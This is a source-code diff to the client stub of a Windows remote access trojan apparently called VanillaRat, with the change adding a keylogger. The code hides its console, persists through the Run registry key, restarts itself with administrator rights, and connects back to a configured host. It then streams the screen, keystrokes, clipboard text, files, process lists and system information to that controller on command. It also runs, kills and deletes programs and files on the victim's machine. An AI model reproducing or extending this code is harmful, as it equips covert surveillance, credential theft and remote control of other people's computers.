@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Configuration;
 using System.Diagnostics;
+using System.Diagnostics.Eventing.Reader;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
@@ -16,6 +17,7 @@ using Microsoft.Win32;
 using StreamLibrary;
 using StreamLibrary.UnsafeCodecs;
 using Telepathy;
+using VanillaRatStub.InformationHelpers;
 using static System.Windows.Forms.Application;
 using Message = Telepathy.Message;
 using ThreadState = System.Threading.ThreadState;
@@ -25,15 +27,16 @@ namespace VanillaRatStub
     internal class Program
     {
         private const int SW_HIDE = 0;
-        private const int SW_SHOW = 5; 
-        private static string CurrentDirectory = string.Empty; 
-        private static readonly Client MainClient = new Client(); 
-        private static bool RDActive; 
-        private static bool USActive; 
-        private static bool ReceivingFile; 
-        private static string FileToWrite = ""; 
+        private const int SW_SHOW = 5;
+        private static string CurrentDirectory = string.Empty;
+        private static bool RDActive;
+        private static bool USActive;
+        private static bool KLActive;
+        private static bool ReceivingFile;
+        private static string FileToWrite = "";
         private static int UpdateInterval;
         private static readonly string InstallDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + AppDomain.CurrentDomain.FriendlyName;
+        private static ApplicationContext MsgLoop;
 
         [DllImport("kernel32.dll")]
         private static extern IntPtr GetConsoleWindow();
@@ -76,10 +79,12 @@ namespace VanillaRatStub
             return new WindowsPrincipal(WindowsIdentity.GetCurrent())
                 .IsInRole(WindowsBuiltInRole.Administrator);
         }
-
         private static void Main(string[] args)
         {
-            if (ClientSettings.Admin == "True" && !IsAdmin())
+            UpdateInterval = Convert.ToInt16(ClientSettings.UpdateInterval);
+            var handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
+            if (ClientSettings.Admin == "True")
             {
                 RaisePerms();
             }
@@ -96,7 +101,7 @@ namespace VanillaRatStub
                 else
                 {
                     if (ClientSettings.Startup == "True")
-                    {                      
+                    {
                         RegistryKey RK =
                             Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                         try
@@ -111,12 +116,9 @@ namespace VanillaRatStub
                         catch { }
                     }
                 }
-            }
-            UpdateInterval = Convert.ToInt16(ClientSettings.UpdateInterval);
-            var handle = GetConsoleWindow(); 
-            ShowWindow(handle, SW_HIDE);
+            }           
             Connect();
-            Console.ReadLine(); 
+            Console.ReadKey();
         }
         private static void UninstallClient()
         {
@@ -129,23 +131,23 @@ namespace VanillaRatStub
             {
                 Console.WriteLine(e);
                 throw;
-            }          
+            }
         }
-      
-       
+
+
         #endregion Entry Point
 
         #region Connection & Data Loop
 
         private static void Connect()
         {
-            while (!MainClient.Connected) 
+            while (!Networking.MainClient.Connected)
             {
                 Thread.Sleep(20);
-                MainClient.Connect(ClientSettings.DNS, Convert.ToInt16(ClientSettings.Port));
+                Networking.MainClient.Connect(ClientSettings.DNS, Convert.ToInt16(ClientSettings.Port));
             }
 
-            while (MainClient.Connected) 
+            while (Networking.MainClient.Connected)
             {
                 Thread.Sleep(UpdateInterval);
                 GetRecievedData();
@@ -159,7 +161,7 @@ namespace VanillaRatStub
         private static void GetRecievedData()
         {
             Message Data;
-            while (MainClient.GetNextMessage(out Data))
+            while (Networking.MainClient.GetNextMessage(out Data))
                 switch (Data.eventType)
                 {
                     case EventType.Connected:
@@ -167,7 +169,7 @@ namespace VanillaRatStub
                         List<byte> ToSend = new List<byte>();
                         ToSend.Add(2); //Client Tag
                         ToSend.AddRange(Encoding.ASCII.GetBytes(ClientSettings.ClientTag));
-                        MainClient.Send(ToSend.ToArray());
+                        Networking.MainClient.Send(ToSend.ToArray());
                         break;
 
                     case EventType.Disconnected:
@@ -201,12 +203,12 @@ namespace VanillaRatStub
                     List<byte> ToSend = new List<byte>();
                     ToSend.Add(5); //File List Type
                     ToSend.AddRange(Encoding.ASCII.GetBytes(Files));
-                    MainClient.Send(ToSend.ToArray());
+                    Networking.MainClient.Send(ToSend.ToArray());
                     ToSend.Clear();
                     ToSend.Add(1); //Notification Type
                     ToSend.AddRange(
                         Encoding.ASCII.GetBytes("The file " + Path.GetFileName(FileToWrite) + " was uploaded."));
-                    MainClient.Send(ToSend.ToArray());
+                    Networking.MainClient.Send(ToSend.ToArray());
                 }
                 catch
                 {
@@ -219,6 +221,8 @@ namespace VanillaRatStub
             string StringForm = string.Empty;
             Thread StreamThread = new Thread(StreamScreen);
             Thread UsageThread = new Thread(StreamUsage);
+            Thread KeyloggerThread = new Thread(StreamKeys);
+            KeyloggerThread.IsBackground = true;
             try
             {
                 StringForm = Encoding.ASCII.GetString(RawData);
@@ -235,7 +239,7 @@ namespace VanillaRatStub
             }
             else if (StringForm == "DisconnectClient")
             {
-                MainClient.Disconnect();
+                Networking.MainClient.Disconnect();
             }
             else if (StringForm == "ShowClientConsole")
             {
@@ -244,7 +248,7 @@ namespace VanillaRatStub
                 List<byte> ToSend = new List<byte>();
                 ToSend.Add(1); //Notification Type
                 ToSend.AddRange(Encoding.ASCII.GetBytes("Console has been shown to client."));
-                MainClient.Send(ToSend.ToArray());
+                Networking.MainClient.Send(ToSend.ToArray());
             }
             else if (StringForm.Contains("MsgBox"))
             {
@@ -314,7 +318,7 @@ namespace VanillaRatStub
                 string ListString = "";
                 foreach (string Process in StringArray) ListString += "][" + Process;
                 ToSend.AddRange(Encoding.ASCII.GetBytes(ListString));
-                MainClient.Send(ToSend.ToArray());
+                Networking.MainClient.Send(ToSend.ToArray());
             }
             else if (StringForm.Contains("EndProcess("))
             {
@@ -327,7 +331,7 @@ namespace VanillaRatStub
                     List<byte> ToSend = new List<byte>();
                     ToSend.Add(1); //Notification Type
                     ToSend.AddRange(Encoding.ASCII.GetBytes("The process " + P.ProcessName + " was killed."));
-                    MainClient.Send(ToSend.ToArray());
+                    Networking.MainClient.Send(ToSend.ToArray());
                 }
                 catch
                 {
@@ -347,7 +351,7 @@ namespace VanillaRatStub
                 List<byte> ToSend = new List<byte>();
                 ToSend.Add(1); //Notification Type
                 ToSend.AddRange(Encoding.ASCII.GetBytes("The website " + ToOpen + " was opened."));
-                MainClient.Send(ToSend.ToArray());
+                Networking.MainClient.Send(ToSend.ToArray());
             }
             else if (StringForm.Equals("GetComputerInfo"))
             {
@@ -367,7 +371,7 @@ namespace VanillaRatStub
                 List<byte> ToSend = new List<byte>();
                 ToSend.Add(4); //Information Type
                 ToSend.AddRange(Encoding.ASCII.GetBytes(ListString));
-                MainClient.Send(ToSend.ToArray());
+                Networking.MainClient.Send(ToSend.ToArray());
             }
             else if (StringForm.Equals("RaisePerms"))
             {
@@ -379,7 +383,7 @@ namespace VanillaRatStub
                 ToSend.Add(1); //Notification Type
                 ToSend.AddRange(Encoding.ASCII.GetBytes("Client is restarting in administration mode."));
                 P.Start();
-                MainClient.Send(ToSend.ToArray());
+                Networking.MainClient.Send(ToSend.ToArray());
                 Environment.Exit(0);
             }
             else if (StringForm.Contains("GetDF{"))
@@ -398,12 +402,12 @@ namespace VanillaRatStub
                     List<byte> ToSend = new List<byte>();
                     ToSend.Add(5); //File List Type
                     ToSend.AddRange(Encoding.ASCII.GetBytes(Files));
-                    MainClient.Send(ToSend.ToArray());
+                    Networking.MainClient.Send(ToSend.ToArray());
                     CurrentDirectory = Directory;
                     ToSend.Clear();
                     ToSend.Add(6); //Current Directory Type
                     ToSend.AddRange(Encoding.ASCII.GetBytes(CurrentDirectory));
-                    MainClient.Send(ToSend.ToArray());
+                    Networking.MainClient.Send(ToSend.ToArray());
                 }
                 catch
                 {
@@ -417,7 +421,7 @@ namespace VanillaRatStub
                     ToSend.Add(7); //Directory Up Type
                     CurrentDirectory = Directory.GetParent(CurrentDirectory).ToString();
                     ToSend.AddRange(Encoding.ASCII.GetBytes(CurrentDirectory));
-                    MainClient.Send(ToSend.ToArray());
+                    Networking.MainClient.Send(ToSend.ToArray());
                 }
                 catch
                 {
@@ -439,14 +443,14 @@ namespace VanillaRatStub
                     List<byte> ToSend = new List<byte>();
                     ToSend.Add(8); //File Type
                     ToSend.AddRange(FileBytes);
-                    MainClient.Send(ToSend.ToArray());
+                    Networking.MainClient.Send(ToSend.ToArray());
                 }
                 catch (Exception EX)
                 {
                     List<byte> ToSend = new List<byte>();
                     ToSend.Add(1);
                     ToSend.AddRange(Encoding.ASCII.GetBytes("Error Downloading: " + EX.Message + ")"));
-                    MainClient.Send(ToSend.ToArray());
+                    Networking.MainClient.Send(ToSend.ToArray());
                 }
             }
             else if (StringForm.Contains("StartFileReceive{"))
@@ -471,7 +475,7 @@ namespace VanillaRatStub
                     List<byte> ToSend = new List<byte>();
                     ToSend.Add(1); //Notification Type
                     ToSend.AddRange(Encoding.ASCII.GetBytes("The file " + Path.GetFileName(ToOpen) + " was opened."));
-                    MainClient.Send(ToSend.ToArray());
+                    Networking.MainClient.Send(ToSend.ToArray());
                 }
                 catch
                 {
@@ -487,7 +491,7 @@ namespace VanillaRatStub
                     ToSend.Add(1); //Notification Type
                     ToSend.AddRange(
                         Encoding.ASCII.GetBytes("The file " + Path.GetFileName(ToDelete) + " was deleted."));
-                    MainClient.Send(ToSend.ToArray());
+                    Networking.MainClient.Send(ToSend.ToArray());
                     string Directory = CurrentDirectory;
                     if (Directory.Equals("BaseDirectory")) Directory = Path.GetPathRoot(Environment.SystemDirectory);
                     string Files = string.Empty;
@@ -500,7 +504,7 @@ namespace VanillaRatStub
                     ToSend.Clear();
                     ToSend.Add(5); //File List Type
                     ToSend.AddRange(Encoding.ASCII.GetBytes(Files));
-                    MainClient.Send(ToSend.ToArray());
+                    Networking.MainClient.Send(ToSend.ToArray());
                 }
                 catch
                 {
@@ -512,7 +516,7 @@ namespace VanillaRatStub
                 {
                     string ClipboardText = "Clipboard is empty or contains an invalid data type.";
                     Thread STAThread = new Thread(
-                        delegate()
+                        delegate ()
                         {
                             if (Clipboard.ContainsText(TextDataFormat.Text))
                                 ClipboardText = Clipboard.GetText(TextDataFormat.Text);
@@ -523,7 +527,7 @@ namespace VanillaRatStub
                     List<byte> ToSend = new List<byte>();
                     ToSend.Add(9); //Clipboard Text Type
                     ToSend.AddRange(Encoding.ASCII.GetBytes(ClipboardText));
-                    MainClient.Send(ToSend.ToArray());
+                    Networking.MainClient.Send(ToSend.ToArray());
                 }
                 catch
                 {
@@ -538,14 +542,22 @@ namespace VanillaRatStub
             {
                 USActive = false;
                 if (UsageThread.ThreadState == ThreadState.Running) UsageThread.Abort();
+            } else if (StringForm.Equals("StartKL"))
+            {
+                Keylogger.SendKeys = true;
+                KLActive = true;               
+                if (KeyloggerThread.ThreadState != ThreadState.Running) KeyloggerThread.Start();
+            } else if (StringForm.Equals("StopKL"))
+            {
+                Keylogger.SendKeys = false;
+                KLActive = false;
+                if (KeyloggerThread.ThreadState == ThreadState.Running) KeyloggerThread.Abort();
             }
         }
-
         #region Remote Desktop
-
         private static void StreamScreen()
         {
-            while (RDActive && MainClient.Connected)
+            while (RDActive && Networking.MainClient.Connected)
             {
                 byte[] ImageBytes = null;
                 IUnsafeCodec UC = new UnsafeStreamCodec(75);
@@ -564,7 +576,7 @@ namespace VanillaRatStub
                 List<byte> ToSend = new List<byte>();
                 ToSend.Add(0); //Image Type
                 ToSend.AddRange(ImageBytes);
-                MainClient.Send(ToSend.ToArray());
+                Networking.MainClient.Send(ToSend.ToArray());
                 Thread.Sleep(UpdateInterval);
             }
         }
@@ -587,7 +599,14 @@ namespace VanillaRatStub
         }
 
         #endregion Remote Desktop
+        #region KL
 
+        private static void StreamKeys()
+        {
+            Keylogger K = new Keylogger();
+            K.InitKeylogger();     
+        }
+        #endregion
         #region UsageStream
 
         private static void StreamUsage()
@@ -595,13 +614,13 @@ namespace VanillaRatStub
             PerformanceCounter PCCPU = new PerformanceCounter("Processor", "% Processor Time", "_Total");
             PerformanceCounter PCMEM = new PerformanceCounter("Memory", "Available MBytes");
             PerformanceCounter PCDISK = new PerformanceCounter("PhysicalDisk", "% Disk Time", "_Total");
-            while (USActive && MainClient.Connected)
+            while (USActive && Networking.MainClient.Connected)
             {
                 string Values = "{" + PCCPU.NextValue() + "}[" + PCMEM.NextValue() + "]<" + PCDISK.NextValue() + ">";
                 List<byte> ToSend = new List<byte>();
                 ToSend.Add(10); //Hardware Usage Type
                 ToSend.AddRange(Encoding.ASCII.GetBytes(Values));
-                MainClient.Send(ToSend.ToArray());
+                Networking.MainClient.Send(ToSend.ToArray());
                 Thread.Sleep(500);
             }
         }
